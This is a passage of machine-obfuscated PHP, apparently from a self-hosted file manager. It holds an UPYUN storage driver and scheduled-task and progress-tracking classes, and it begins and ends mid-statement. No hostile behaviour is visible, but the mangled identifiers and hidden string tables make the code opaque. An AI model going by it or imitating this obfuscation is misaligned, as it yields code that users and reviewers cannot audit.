$§å–Œ‡¦ = 0; do { $§å–Œ‡¦++; $Áººœ“ = $this->uploadPart($ŒåÃÚŒ«, $Áººœ“, $Ó¯Ö™§); } while (!$Áººœ“ && $§å–Œ‡¦ < 3); if (!$Áººœ“) { return !1; } $¡‚Ù÷©© = $Áººœ“[$ë‰™ò“¿[1593]]; $ÇÙÕª˜ï += $ˆ‰ı¦Ñ°; } while ($¡‚Ù÷©© != -1); fclose($Ôè«ö‡ü); $æÉæ í¬ = array($ë‰™ò“¿[1595], $ë‰™ò“¿[1596] . $Áººœ“[$ë‰™ò“¿[1597]], $ë‰™ò“¿[1591]); $ã–·Ú£» = $this->ussRequest($ŒåÃÚŒ«, $ë‰™ò“¿[259], !1, $æÉæ í¬); return $ã–·Ú£»[$ë‰™ò“¿[1310]] ? $this->getPathOuter($ßşÁûêÜ) : !1; } private function uploadPart($ÊÃ®ªİ£, $¢¨Ò™¾æ, &$ÅšÚ»š¹) { $‰ß¢¸ø =& $_SERVER[Ùæõ‰Ï’]; $Ó«‹´«³ = array($‰ß¢¸ø[1598], $‰ß¢¸ø[1596] . $¢¨Ò™¾æ[$‰ß¢¸ø[1597]], $‰ß¢¸ø[1599] . $¢¨Ò™¾æ[$‰ß¢¸ø[1593]], $‰ß¢¸ø[146] . $¢¨Ò™¾æ[$‰ß¢¸ø[1594]]); $¢òı†¡ = $this->ussRequest($ÊÃ®ªİ£, $‰ß¢¸ø[259], $ÅšÚ»š¹, $Ó«‹´«³); return !$¢òı†¡[$‰ß¢¸ø[1310]] ? $¢òı†¡[$‰ß¢¸ø[1310]] : $¢òı†¡[$‰ß¢¸ø[1300]]; } public function uploadFormData($¬î—©Ì, $Ğ…î×­ = 3600) { return $this->uploadPolicy($¬î—©Ì, $Ğ…î×­); } public function multiUploadFormData($…õÏ«í, $»†û›‘Ó = 3600) { $”½ôÑªØ =& $_SERVER[Ùæõ‰Ï’]; $´Å²˜‚Á = (int) $GLOBALS[$”½ôÑªØ[7]][$”½ôÑªØ[79]]; return $this->uploadPolicy($…õÏ«í, $»†û›‘Ó, $´Å²˜‚Á); } private function uploadPolicy($êÚå³Ğ¿, $×çóü« = 3600, $ä×¦ÙÖú = 0) { $°ş¿ùÓ¯ =& $_SERVER[Ùæõ‰Ï’]; $İèÚ´©Â = $°ş¿ùÓ¯[8] . $this->bucket; $â‚Â‹Ô¹ = gmdate($°ş¿ùÓ¯[1504]); $ÚŸØ†¨º = array($°ş¿ùÓ¯[1600] => $this->bucket, $°ş¿ùÓ¯[1601] => $êÚå³Ğ¿, $°ş¿ùÓ¯[1602] => time() + $×çóü«, $°ş¿ùÓ¯[1603] => $â‚Â‹Ô¹); if ($ä×¦ÙÖú) { $ÚŸØ†¨º[$°ş¿ùÓ¯[1489]] = $ä×¦ÙÖú; } $öãäŒˆ¿ = base64_encode(json_encode($ÚŸØ†¨º)); $•·‘üúç = base64_encode(hash_hmac($°ş¿ùÓ¯[1557], "\120\x4f\123\x54\x26{$İèÚ´©Â}\46{$â‚Â‹Ô¹}\x26{$öãäŒˆ¿}", md5("{$this->userpass}"), !0)); $±ø‡‰üÚ = array($°ş¿ùÓ¯[293] => $öãäŒˆ¿, $°ş¿ùÓ¯[1604] => "\x55\x50\x59\x55\116\40{$this->username}\x3a{$•·‘üúç}", $°ş¿ùÓ¯[208] => $this->endpoint . $İèÚ´©Â); return $±ø‡‰üÚ; } public function download($îÚ£ò¤…, $ı»ö¥ê½) { $Ü½„œÎ = IO::getPathInner(IO::mkfile($ı»ö¥ê½)); if (!($—æî‘Ï© = $this->link($îÚ£ò¤…))) { return !1; } $î—œÖïÍ = 0; $¸€¶ÔŠù = 1024 * 200; $ñ‚Â‚¾ù = fopen($Ü½„œÎ, $_SERVER[Ùæõ‰Ï’][1552]); while (!0) { $‡ÏÍ˜„‚ = $this->fileSubstr($îÚ£ò¤…, $î—œÖïÍ, $¸€¶ÔŠù); if ($‡ÏÍ˜„‚ === !1) { return !1; } fwrite($ñ‚Â‚¾ù, $‡ÏÍ˜„‚); $î—œÖïÍ += $¸€¶ÔŠù; if (strlen($‡ÏÍ˜„‚) < $¸€¶ÔŠù) { break; } } fclose($ñ‚Â‚¾ù); return $ı»ö¥ê½; } public function link($øÛåÕüÁ, $ƒú«†ˆá = array()) { $Ëõ×ã•š =& $_SERVER[Ùæõ‰Ï’]; $øÛåÕüÁ = trim($øÛåÕüÁ, $Ëõ×ã•š[8]); if (!empty($this->token)) { $©ù‘Áâà = strtotime(date($Ëõ×ã•š[1605])); $Ş†Œ¶íó = substr(md5($this->token . $Ëõ×ã•š[360] . $©ù‘Áâà . $Ëõ×ã•š[1606] . $øÛåÕüÁ), 12, 8) . $©ù‘Áâà; $ƒú«†ˆá[] = $Ëõ×ã•š[1607] . $Ş†Œ¶íó; } $Ìø‘½·û = !empty($ƒú«†ˆá) ? $Ëõ×ã•š[76] . implode($Ëõ×ã•š[360], $ƒú«†ˆá) : $Ëõ×ã•š[12]; return $this->getHost() . $Ëõ×ã•š[8] . $øÛåÕüÁ . $Ìø‘½·û; } public function fileOut($¥šÓ‚¬, $ ¡ôÀ = false, $ËÄØ…„– = false, $ôìøÛÏ› = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($¥šÓ‚¬, $ ¡ôÀ, $ËÄØ…„–, $ôìøÛÏ›); } if (!$ËÄØ…„–) { $ËÄØ…„– = $this->pathThis($¥šÓ‚¬); } $èãÉÚÙ = $ ¡ôÀ ? array($_SERVER[Ùæõ‰Ï’][1608] . rawurlencode($ËÄØ…„–)) : array(); $°Ûğôïñ = $this->link($¥šÓ‚¬, $èãÉÚÙ); $this->fileOutLink($°Ûğôïñ); } public function fileOutServer($ŸƒÔ³àü, $óÎÒÒ İ = false, $Êª¨¥ê = false, $Ò×ÅÏÁö = '') { parent::fileOut($ŸƒÔ³àü, $óÎÒÒ İ, $Êª¨¥ê, $Ò×ÅÏÁö); } public function fileOutImage($×Áä³’Ï, $Æí¹ÓÂß = 250) { $ĞıòË„É = $this->link($×Áä³’Ï . $_SERVER[Ùæõ‰Ï’][1609] . $Æí¹ÓÂß); $this->fileOutLink($ĞıòË„É); } public function fileOutImageServer($äÛË‡°×, $¹ß†ÌÃ” = 250) { parent::fileOutImage($äÛË‡°×, $¹ß†ÌÃ”); } public function hashMd5($³Ÿµ”Ú) { $Ôã¼Œş =& $_SERVER[Ùæõ‰Ï’]; $¶ÃÅæ™¹ = $this->_objectMeta($³Ÿµ”Ú); return isset($¶ÃÅæ™¹[$Ôã¼Œş[245]]) ? $¶ÃÅæ™¹[$Ôã¼Œş[245]] : !1; } public function size($¶ÏòÙü) { $Ú…à˜ÃĞ = $this->objectMeta($¶ÏòÙü); return $Ú…à˜ÃĞ ? $Ú…à˜ÃĞ[$_SERVER[Ùæõ‰Ï’][79]] : 0; } public function info($Úˆµ–Æ) { if ($this->isFolder($Úˆµ–Æ)) { return $this->folderInfo($Úˆµ–Æ); } else { if ($this->isFile($Úˆµ–Æ)) { return $this->fileInfo($Úˆµ–Æ); } } return !1; } public function exist($ßœÇ–‡²) { return $this->isFile($ßœÇ–‡²) || $this->isFolder($ßœÇ–‡²); } public function isFile($ãû­óİ¡) { return !$this->isFolder($ãû­óİ¡) && $this->objectMeta($ãû­óİ¡); } public function isFolder($·çÁô˜º) { return $this->cacheMethod($_SERVER[Ùæõ‰Ï’][179], $·çÁô˜º); } protected function objectMeta($ª³ñ˜Ì) { return $this->cacheMethod($_SERVER[Ùæõ‰Ï’][181], $ª³ñ˜Ì); } protected function _objectMeta($®¶¡ÏÖ²) { $ë‹áè« =& $_SERVER[Ùæõ‰Ï’]; if ($®¶¡ÏÖ² == $ë‹áè«[12] || $®¶¡ÏÖ² == $ë‹áè«[8]) { return array(); } $«¹Ïøù‡ = $this->ussRequest($®¶¡ÏÖ², $ë‹áè«[1610]); if (!$«¹Ïøù‡[$ë‹áè«[1310]]) { return null; } $àªŸş = isset($«¹Ïøù‡[$ë‹áè«[1300]]) ? $«¹Ïøù‡[$ë‹áè«[1300]] : array(); if (!isset($àªŸş[$ë‹áè«[1611]])) { return null; } $¼¶îÁ = array($ë‹áè«[33] => isset($àªŸş[$ë‹áè«[1611]]) ? $àªŸş[$ë‹áè«[1611]] : null, $ë‹áè«[79] => isset($àªŸş[$ë‹áè«[1612]]) ? $àªŸş[$ë‹áè«[1612]] : null, $ë‹áè«[245] => isset($àªŸş[$ë‹áè«[1613]]) ? $àªŸş[$ë‹áè«[1613]] : null, $ë‹áè«[1580] => isset($àªŸş[$ë‹áè«[1614]]) ? $àªŸş[$ë‹áè«[1614]] : null); $¼¶îÁ[$ë‹áè«[1581]] = isset($àªŸş[$ë‹áè«[1615]]) ? strtotime($àªŸş[$ë‹áè«[1615]]) : $¼¶îÁ[$ë‹áè«[1580]]; return $¼¶îÁ; } protected function _isFolder($Ì´¤ìµŠ) { $şĞ›õ¥ö =& $_SERVER[Ùæõ‰Ï’]; if ($Ì´¤ìµŠ == $şĞ›õ¥ö[12] || $Ì´¤ìµŠ == $şĞ›õ¥ö[8]) { return !0; } $ƒÈ×µÈÃ = $this->_objectMeta($Ì´¤ìµŠ); return isset($ƒÈ×µÈÃ[$şĞ›õ¥ö[33]]) && $ƒÈ×µÈÃ[$şĞ›õ¥ö[33]] == $şĞ›õ¥ö[78] ? !0 : !1; } } goto D‰ÊªÙ‚; cÌºÜáŠÒì: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ôàá²à• =& $_SERVER[Ùæõ‰Ï’]; if (self::valueGet($Ôàá²à•[833]) != $Ôàá²à•[91]) { return; } if (self::valueGet($Ôàá²à•[1731]) == $Ôàá²à•[91]) { $³ÅåÌ»î = self::valueGet($Ôàá²à•[1732]); if (time() - $³ÅåÌ»î > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Ôàá²à•[1731], $Ôàá²à•[91]); self::log($Ôàá²à•[1733] . ACTION . $Ôàá²à•[1734]); Hook::bind($Ôàá²à•[1735], $Ôàá²à•[1736]); $ƒâóÂéı = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ôàá²à•[833]) != $Ôàá²à•[91]) { self::valueSet($Ôàá²à•[1731], $Ôàá²à•[228]); self::log($Ôàá²à•[1737]); die; } $Í’ˆÏÇÏ = time(); if ($Í’ˆÏÇÏ - $ƒâóÂéı >= 60) { self::valueSet(array($Ôàá²à•[1731] => $Ôàá²à•[91], $Ôàá²à•[1732] => $Í’ˆÏÇÏ)); $ƒâóÂéı = $Í’ˆÏÇÏ; } if (!file_exists(USER_SYSTEM . $Ôàá²à•[1738])) { self::valueSet(array($Ôàá²à•[1731] => $Ôàá²à•[228], $Ôàá²à•[833] => $Ôàá²à•[228])); self::log($Ôàá²à•[1739]); die; } $ÌÏ¤”œ— = file_get_contents(BASIC_PATH . $Ôàá²à•[1740]); $ŸÒìÒ‡° = KOD_VERSION . $Ôàá²à•[10] . KOD_VERSION_BUILD; $êÓÙòÃØ = match_text($ÌÏ¤”œ—, $Ôàá²à•[1741]) . $Ôàá²à•[10] . match_text($ÌÏ¤”œ—, $Ôàá²à•[1742]); if ($êÓÙòÃØ != $ŸÒìÒ‡°) { self::restart(); self::log("\x73\x74\x6f\x70\145\144\x2e\133\x76\145\162\x73\x69\157\x6e\40\x75\160\x64\x61\164\x65\73{$versionNow}\40\75\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $şåŠŸÔœ =& $_SERVER[Ùæõ‰Ï’]; http_close(); $GLOBALS[$şåŠŸÔœ[1743]] = 1; $_SERVER[$şåŠŸÔœ[1744]] = $şåŠŸÔœ[1745]; $_COOKIE = array(); $GLOBALS[$şåŠŸÔœ[1746]] = 1; $GLOBALS[$şåŠŸÔœ[1747]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ææ˜¹¾Â =& $_SERVER[Ùæõ‰Ï’]; http_close(); self::valueSet($ææ˜¹¾Â[833], $ææ˜¹¾Â[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ææ˜¹¾Â[1731] => $ææ˜¹¾Â[228], $ææ˜¹¾Â[833] => $ææ˜¹¾Â[91])); self::log($ææ˜¹¾Â[1748]); } public static function taskSwitch() { $•ËñÅŞû =& $_SERVER[Ùæõ‰Ï’]; $ú„¦Œ‰ = self::valueGet($•ËñÅŞû[833]) == $•ËñÅŞû[91] ? $•ËñÅŞû[228] : $•ËñÅŞû[91]; self::valueSet($•ËñÅŞû[833], $ú„¦Œ‰); } public static function shutdownEvent() { $¼¼ú°‘µ =& $_SERVER[Ùæõ‰Ï’]; self::valueSet($¼¼ú°‘µ[1731], $¼¼ú°‘µ[228]); self::log($¼¼ú°‘µ[1749]); } public static function config($ïÄÌ°£î, $ñªß×¯ß) { self::valueSet($_SERVER[Ùæõ‰Ï’][833], $ïÄÌ°£î); } private static function taskRunAll() { $‚ì ØôÛ =& $_SERVER[Ùæõ‰Ï’]; $µöŸ”° = timeFloat(); $î¡ûË­Ö = Model($‚ì ØôÛ[1750])->listData(); $àÇÑ = count($î¡ûË­Ö); for ($±êÜ¨Ó§ = 0; $±êÜ¨Ó§ < $àÇÑ; $±êÜ¨Ó§++) { $ø÷ïìù = $î¡ûË­Ö[$±êÜ¨Ó§]; if (!$ø÷ïìù[$‚ì ØôÛ[475]] || $ø÷ïìù[$‚ì ØôÛ[1751]] != $‚ì ØôÛ[91]) { continue; } if (!self::taskTimeCheck($ø÷ïìù)) { continue; } self::taskRun($ø÷ïìù); } Hook::trigger($‚ì ØôÛ[1752]); self::taskQueueRun($µöŸ”°); } private static function taskQueueRun($ÉêÌÒËò) { $û¹ÙÖ = 10; while (!0) { $åÉƒ“ºı = TaskQueue::run(); if ($åÉƒ“ºı === !1) { break; } if (timeFloat() - $ÉêÌÒËò >= $û¹ÙÖ) { break; } } } private static function taskTimeCheck($Ø„å€±Ü) { $éÂÄÉßœ =& $_SERVER[Ùæõ‰Ï’]; $øË“×Œ£ = json_decode($Ø„å€±Ü[$éÂÄÉßœ[206]], !0); $óí†¨¼ = intval($Ø„å€±Ü[$éÂÄÉßœ[1732]]); $äÕ‚¤º“ = strtotime($éÂÄÉßœ[1753] . $øË“×Œ£[$éÂÄÉßœ[1754]] . $éÂÄÉßœ[1755]) - strtotime($éÂÄÉßœ[1756]); $ƒšåÆ¶ = time() - strtotime(date($éÂÄÉßœ[1757]) . $éÂÄÉßœ[1758]); $ä˜ì™…æ = $ƒšåÆ¶ >= $äÕ‚¤º“ && $ƒšåÆ¶ <= $äÕ‚¤º“ + 3600; switch ($øË“×Œ£[$éÂÄÉßœ[33]]) { case $éÂÄÉßœ[1759]: if (time() - $óí†¨¼ < 3600 * 24 * 30) { return !1; } if ($øË“×Œ£[$éÂÄÉßœ[1759]] == date($éÂÄÉßœ[1760]) && $ä˜ì™…æ) { return !0; } break; case $éÂÄÉßœ[1761]: if (time() - $óí†¨¼ < 3600 * 24 * 7) { return !1; } $æŸİÛ‚ = date($éÂÄÉßœ[1762]) == 0 ? 7 : date($éÂÄÉßœ[1762]); if ($øË“×Œ£[$éÂÄÉßœ[1761]] == $æŸİÛ‚ && $ä˜ì™…æ) { return !0; } break; case $éÂÄÉßœ[1754]: if (time() - $óí†¨¼ < 3600 * 24) { return !1; } if ($ä˜ì™…æ) { return !0; } break; case $éÂÄÉßœ[1763]: if (time() - $óí†¨¼ >= floatval($øË“×Œ£[$éÂÄÉßœ[1763]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $µáÒ¡£Ğ =& $_SERVER[Ùæõ‰Ï’]; static $ëØ€¦¹Ï = 0; $äØÔ¶Úî = 300; if (!$ëØ€¦¹Ï) { $ëØ€¦¹Ï = time(); } if (time() - $ëØ€¦¹Ï < $äØÔ¶Úî) { return; } $ëØ€¦¹Ï = time(); $æÓæ®¡ = Model($µáÒ¡£Ğ[577])->db($µáÒ¡£Ğ[12]); if ($æÓæ®¡) { $æÓæ®¡->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($µáÒ¡£Ğ[1764], $µáÒ¡£Ğ[1765]); die; } } public static function taskRun($Ò¨í¡‰) { $âÑ‡’Ì“ =& $_SERVER[Ùæõ‰Ï’]; self::log($âÑ‡’Ì“[1766] . $Ò¨í¡‰[$âÑ‡’Ì“[475]] . $âÑ‡’Ì“[1767] . $Ò¨í¡‰[$âÑ‡’Ì“[32]] . $âÑ‡’Ì“[1768] . $Ò¨í¡‰[$âÑ‡’Ì“[1769]]); Model($âÑ‡’Ì“[1750])->run($Ò¨í¡‰[$âÑ‡’Ì“[475]]); $Ü¿ôäï = timeFloat(); $Æ‰òÜà = $âÑ‡’Ì“[12]; switch ($Ò¨í¡‰[$âÑ‡’Ì“[33]]) { case $âÑ‡’Ì“[383]: $ÃµùòÜ÷ = url_request($Ò¨í¡‰[$âÑ‡’Ì“[1769]], $âÑ‡’Ì“[261], !1, !1, !1, !1, 10); if ($ÃµùòÜ÷[$âÑ‡’Ì“[833]]) { $Æ‰òÜà = strlen($ÃµùòÜ÷[$âÑ‡’Ì“[1300]]); } break; case $âÑ‡’Ì“[260]: $Æ‰òÜà = Hook::apply($Ò¨í¡‰[$âÑ‡’Ì“[1769]]); default: break; } Model($âÑ‡’Ì“[1770])->add(array($âÑ‡’Ì“[1771] => $âÑ‡’Ì“[12], $âÑ‡’Ì“[1772] => $âÑ‡’Ì“[228], $âÑ‡’Ì“[33] => $âÑ‡’Ì“[1773] . $Ò¨í¡‰[$âÑ‡’Ì“[475]], $âÑ‡’Ì“[1774] => json_encode(array($âÑ‡’Ì“[32] => $Ò¨í¡‰[$âÑ‡’Ì“[32]], $âÑ‡’Ì“[1775] => timeFloat() - $Ü¿ôäï, $âÑ‡’Ì“[369] => $Æ‰òÜà)))); $Ë‹‡ÈªŸ = $Æ‰òÜà ? $âÑ‡’Ì“[1776] . $Æ‰òÜà : $âÑ‡’Ì“[12]; self::log($âÑ‡’Ì“[1777] . $Ò¨í¡‰[$âÑ‡’Ì“[475]] . $âÑ‡’Ì“[178] . $Ë‹‡ÈªŸ); return !0; } public static function valueGet($«¤Õß€Ú) { $²´–ÅÁŸ =& $_SERVER[Ùæõ‰Ï’]; $¼¬¨†ùå = $²´–ÅÁŸ[1778]; $†í¾±ÁĞ = Model($²´–ÅÁŸ[508])->get($«¤Õß€Ú, $¼¬¨†ùå); if (is_null($†í¾±ÁĞ)) { Model($²´–ÅÁŸ[508])->set($²´–ÅÁŸ[833], $²´–ÅÁŸ[91], $¼¬¨†ùå); Model($²´–ÅÁŸ[508])->set($²´–ÅÁŸ[1731], $²´–ÅÁŸ[228], $¼¬¨†ùå); $†í¾±ÁĞ = Model($²´–ÅÁŸ[508])->get($«¤Õß€Ú, $¼¬¨†ùå); } return $†í¾±ÁĞ; } private static function valueSet($ãæ¥…²Œ, $©¬ü§Ëâ = false) { $ëÖ¦ôø© =& $_SERVER[Ùæõ‰Ï’]; $Ø›˜” = $ëÖ¦ôø©[1779]; CacheLock::lock($Ø›˜”); $ÇÄŸ·­Í = Model($ëÖ¦ôø©[508])->set($ãæ¥…²Œ, $©¬ü§Ëâ, $ëÖ¦ôø©[1778]); CacheLock::unlock($Ø›˜”); return $ÇÄŸ·­Í; } protected static function log($¹ç­şçğ) { write_log($¹ç­şçğ, $_SERVER[Ùæõ‰Ï’][1765]); } private static function cacheClear() { $çŒ»ŠÚ« =& $_SERVER[Ùæõ‰Ï’]; Cache::clearMemory(Model($çŒ»ŠÚ«[508])->cacheKey($çŒ»ŠÚ«[1778])); Cache::clearMemory(Model($çŒ»ŠÚ«[508])->cacheKey($çŒ»ŠÚ«[1780])); Model($çŒ»ŠÚ«[1750])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\x72\165\156\x6e\x69\x6e\147"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¤®²•’£, $‰„İÜÅ = '', $ÃôõÅå– = 0, $Ô³ú½’š = '') { $¡²ƒöŞ„ =& $_SERVER[Ùæõ‰Ï’]; if (self::get($¤®²•’£)) { return; } $this->task = array($¡²ƒöŞ„[475] => $¤®²•’£, $¡²ƒöŞ„[1781] => USER_ID, $¡²ƒöŞ„[1670] => $Ô³ú½’š, $¡²ƒöŞ„[526] => $¡²ƒöŞ„[12], $¡²ƒöŞ„[33] => $‰„İÜÅ, $¡²ƒöŞ„[1156] => $¡²ƒöŞ„[12], $¡²ƒöŞ„[1154] => $ÃôõÅå–, $¡²ƒöŞ„[1782] => 0, $¡²ƒöŞ„[1783] => 0, $¡²ƒöŞ„[1784] => 0, $¡²ƒöŞ„[1785] => timeFloat(), $¡²ƒöŞ„[1786] => 0, $¡²ƒöŞ„[1787] => 0, $¡²ƒöŞ„[1788] => 0, $¡²ƒöŞ„[1789] => 0, $¡²ƒöŞ„[833] => $¡²ƒöŞ„[1731]); $GLOBALS[$¡²ƒöŞ„[1790]] = 1; Hook::bind($¡²ƒöŞ„[1735], array($this, $¡²ƒöŞ„[1791])); Hook::bind($¡²ƒöŞ„[1792], array($this, $¡²ƒöŞ„[1793])); $this->startAfter(); Hook::trigger($¡²ƒöŞ„[1794], $this->task); $this->task[$¡²ƒöŞ„[1787]] = timeFloat(); } public function end($ùàäŠ ç = '') { $¢Ş¤²¼ù =& $_SERVER[Ùæõ‰Ï’]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$¢Ş¤²¼ù[1787]]) { self::valueSet($this->task[$¢Ş¤²¼ù[475]], !1); } $this->isEnd = !0; if ($ùàäŠ ç) { $this->task[$¢Ş¤²¼ù[526]] = $ùàäŠ ç; } self::log($¢Ş¤²¼ù[1795] . $this->task[$¢Ş¤²¼ù[475]] . $¢Ş¤²¼ù[1796] . sprintf($¢Ş¤²¼ù[933], timeFloat() - $this->task[$¢Ş¤²¼ù[1785]]) . $¢Ş¤²¼ù[1797]); Hook::unbind($¢Ş¤²¼ù[1735], array($this, $¢Ş¤²¼ù[1791])); Hook::unbind($¢Ş¤²¼ù[1792], array($this, $¢Ş¤²¼ù[1793])); $this->endAfter(); $şÇ‘”ˆĞ = $this->task; $this->task = !1; Hook::trigger($¢Ş¤²¼ù[1798], $şÇ‘”ˆĞ); } public function update($ÌÊ¥å¹ö = 0, $æªÚÂØ = false) { $ÕØÀÜŞê =& $_SERVER[Ùæõ‰Ï’]; $½ÙŠ¦í =& $this->task; if (!$½ÙŠ¦í) { return; } $½ÙŠ¦í[$ÕØÀÜŞê[1782]] += $ÌÊ¥å¹ö; $½ÙŠ¦í[$ÕØÀÜŞê[1786]] = timeFloat(); if ($½ÙŠ¦í[$ÕØÀÜŞê[1154]]) { if ($½ÙŠ¦í[$ÕØÀÜŞê[1154]] < $½ÙŠ¦í[$ÕØÀÜŞê[1782]]) { $½ÙŠ¦í[$ÕØÀÜŞê[1154]] = $½ÙŠ¦í[$ÕØÀÜŞê[1782]]; } $ö˜Í´‡ = timeFloat() - $½ÙŠ¦í[$ÕØÀÜŞê[1785]] - $½ÙŠ¦í[$ÕØÀÜŞê[1788]]; if ($ö˜Í´‡ <= 0) { $ö˜Í´‡ = 0.001; } $½ÙŠ¦í[$ÕØÀÜŞê[1783]] = $½ÙŠ¦í[$ÕØÀÜŞê[1782]] / $½ÙŠ¦í[$ÕØÀÜŞê[1154]]; $½ÙŠ¦í[$ÕØÀÜŞê[1784]] = $½ÙŠ¦í[$ÕØÀÜŞê[1782]] / $ö˜Í´‡; if ($½ÙŠ¦í[$ÕØÀÜŞê[1783]] > 0) { $½ÙŠ¦í[$ÕØÀÜŞê[1789]] = $ö˜Í´‡ * (1 - $½ÙŠ¦í[$ÕØÀÜŞê[1783]]) / $½ÙŠ¦í[$ÕØÀÜŞê[1783]]; } $½ÙŠ¦í[$ÕØÀÜŞê[1789]] = $½ÙŠ¦í[$ÕØÀÜŞê[1789]] <= 0 ? 0 : $½ÙŠ¦í[$ÕØÀÜŞê[1789]]; } $this->updateAfter(); $Õ¹õ»ìÑ = 0.2; if (timeFloat() - $½ÙŠ¦í[$ÕØÀÜŞê[1787]] < $Õ¹õ»ìÑ && !$æªÚÂØ) { return; } $•äÜÉÅ = self::get($½ÙŠ¦í[$ÕØÀÜŞê[475]]); $®Óí·…ı = $•äÜÉÅ[$ÕØÀÜŞê[833]]; if ($®Óí·…ı == self::STATYS_KILL) { $àü­—Ì… = array($ÕØÀÜŞê[1799] => LNG($ÕØÀÜŞê[1800]), $ÕØÀÜŞê[1310] => !1); Cache::set($ÕØÀÜŞê[1801] . $this->task[$ÕØÀÜŞê[475]], $àü­—Ì…, 30); $this->onKill(); $this->end(); die; } else { if ($®Óí·…ı == self::STATYS_STOP) { $™ã¶²Ää = 2; $•äÜÉÅ[$ÕØÀÜŞê[1788]] += $™ã¶²Ää; self::valueSet($½ÙŠ¦í[$ÕØÀÜŞê[475]], $•äÜÉÅ); sleep($™ã¶²Ää); $this->update(); return; } } $½ÙŠ¦í[$ÕØÀÜŞê[833]] = $®Óí·…ı ? $®Óí·…ı : $½ÙŠ¦í[$ÕØÀÜŞê[833]]; $½ÙŠ¦í[$ÕØÀÜŞê[1788]] = $•äÜÉÅ[$ÕØÀÜŞê[1788]] ? $•äÜÉÅ[$ÕØÀÜŞê[1788]] : 0; $½ÙŠ¦í[$ÕØÀÜŞê[1787]] = timeFloat(); Hook::trigger($ÕØÀÜŞê[1802], $½ÙŠ¦í); self::valueSet($½ÙŠ¦í[$ÕØÀÜŞê[475]], $½ÙŠ¦í); } public function onKillSet($ÉÊÉ®†Ñ, $†®á¡ä¼ = array()) { $this->onKillCall = array($ÉÊÉ®†Ñ, $†®á¡ä¼); } public function onKill() { $‚ãÙ÷î» =& $_SERVER[Ùæõ‰Ï’]; self::log($‚ãÙ÷î»[1795] . $this->task[$‚ãÙ÷î»[475]] . $‚ãÙ÷î»[1803]); Hook::trigger($‚ãÙ÷î»[1804], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÎéÕöúÌ) { $ëÓ‹Ÿ³ö =& $_SERVER[Ùæõ‰Ï’]; Cache::set($ëÓ‹Ÿ³ö[1801] . $this->task[$ëÓ‹Ÿ³ö[475]], $ÎéÕöúÌ, 60); return $ÎéÕöúÌ; } public static function get($úÓ€£) { $»²ÜÈ× =& $_SERVER[Ùæõ‰Ï’]; $¸éôı°» = self::valueGet($úÓ€£); if (is_array($¸éôı°») && $¸éôı°»[$»²ÜÈ×[1805]]) { $œêİÕ = ActionApply($¸éôı°»[$»²ÜÈ×[1805]], array($¸éôı°»)); $¸éôı°» = is_array($œêİÕ) ? $œêİÕ : $¸éôı°»; } return $¸éôı°»; } public static function listData() { $•Èæçåğ = self::valueGet(); return array_sort_by($•Èæçåğ, $_SERVER[Ùæõ‰Ï’][1785], !0); } public static function kill($˜™³„½ƒ) { return self::changeStatus($˜™³„½ƒ, self::STATYS_KILL); } public static function stop($Ğµ®øËã) { return self::changeStatus($Ğµ®øËã, self::STATYS_STOP); } public static function restart($Şƒ¬Òí) { return self::changeStatus($Şƒ¬Òí, self::STATYS_RUNNING); } public static function killAll() { $È®¯øŒ =& $_SERVER[Ùæõ‰Ï’]; $É×‚ÒÈæ = self::listData(); foreach ($É×‚ÒÈæ as $«­«â¥) { self::kill($«­«â¥[$È®¯øŒ[475]]); } sleep(2); foreach ($É×‚ÒÈæ as $«­«â¥) { self::valueSet($«­«â¥[$È®¯øŒ[475]], !1); } } private static function changeStatus($²ÔØüÔÜ, $ò‹ô­Æ) { $¡Éæ”• =& $_SERVER[Ùæõ‰Ï’]; $Šø¥ÂÌ = self::valueGet($²ÔØüÔÜ); if (!$Šø¥ÂÌ) { return !1; } $Šø¥ÂÌ[$¡Éæ”•[833]] = $ò‹ô­Æ; self::valueSet($²ÔØüÔÜ, $Šø¥ÂÌ); self::log($¡Éæ”•[1806] . $Šø¥ÂÌ[$¡Éæ”•[475]] . $¡Éæ”•[1807] . $ò‹ô­Æ); return !0; } public static function valueGet($¨×ÌÔ®ä = false) { $ö£Ê‘ãù =& $_SERVER[Ùæõ‰Ï’]; if ($¨×ÌÔ®ä) { $«õ«ò›¡ = Model($ö£Ê‘ãù[520])->where(array($ö£Ê‘ãù[97] => $¨×ÌÔ®ä, $ö£Ê‘ãù[33] => $ö£Ê‘ãù[1163]))->find(); return $«õ«ò›¡ ? json_decode($«õ«ò›¡[$ö£Ê‘ãù[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($’¿áŞŞÂ = false) { $È«©È˜à =& $_SERVER[Ùæõ‰Ï’]; $å¦‚‰Ó = array($È«©È˜à[33] => $È«©È˜à[1163]); if ($’¿áŞŞÂ) { $å¦‚‰Ó[$È«©È˜à[1781]] = $’¿áŞŞÂ; } $Á¾æè­ = Model($È«©È˜à[520])->where($å¦‚‰Ó)->select(); $Á¾æè­ = $Á¾æè­ ? $Á¾æè­ : array(); foreach ($Á¾æè­ as $¡ìßäÇî => $ûˆ°ì©É) { $Á¾æè­[$¡ìßäÇî] = json_decode($ûˆ°ì©É[$È«©È˜à[450]], !0); } return $Á¾æè­; } public static function valueSet($´º…å¦„, $Á×™†Ÿ†) { $Ç»ğ½ïè =& $_SERVER[Ùæõ‰Ï’]; if (!$Á×™†Ÿ†) { return Model($Ç»ğ½ïè[520])->where(array($Ç»ğ½ïè[97] => $´º…å¦„, 